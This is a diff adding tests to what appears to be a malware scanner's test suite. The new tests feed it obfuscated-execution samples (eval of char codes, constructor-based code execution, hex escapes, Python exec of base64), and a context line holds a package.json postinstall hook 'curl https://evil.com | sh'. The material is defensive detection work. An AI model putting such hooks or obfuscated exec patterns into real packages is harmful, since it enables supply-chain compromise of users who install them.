@@ -35,6 +35,30 @@ describe("scanFileContent", () => {
     expect(findRule(findings, "obfuscated-malware-pattern")).toBe(true);
   });
 
+  it("detects JS charcode dynamic execution", () => {
+    const findings = scanFileContent("eval(String.fromCharCode(101, 118, 97, 108))", "index.js");
+    expect(findRule(findings, "js-obfuscated-charcode")).toBe(true);
+  });
+
+  it("detects JS constructor and reflection abuse", () => {
+    const findings1 = scanFileContent("[]['filter']['constructor']('alert(1)')()", "index.js");
+    expect(findRule(findings1, "js-obfuscated-constructors")).toBe(true);
+
+    const findings2 = scanFileContent("Reflect.apply(fn, ctx, args)", "index.js");
+    expect(findRule(findings2, "js-obfuscated-constructors")).toBe(true);
+  });
+
+  it("detects JS hex escape sequence density", () => {
+    const hexMalware = "const x = '\\x65\\x76\\x61\\x6c\\x28\\x29\\x3b\\x0a';";
+    const findings = scanFileContent(hexMalware, "index.js");
+    expect(findRule(findings, "js-obfuscated-hex")).toBe(true);
+  });
+
+  it("detects Python base64 dynamic execution", () => {
+    const findings = scanFileContent("exec(base64.b64decode('aW1wb3J0IG9z'))", "setup.py");
+    expect(findRule(findings, "python-obfuscated-base64-exec")).toBe(true);
+  });
+
   it("detects suspicious postinstall in package.json", () => {
     const content = JSON.stringify({
       scripts: { postinstall: "curl https://evil.com | sh" },
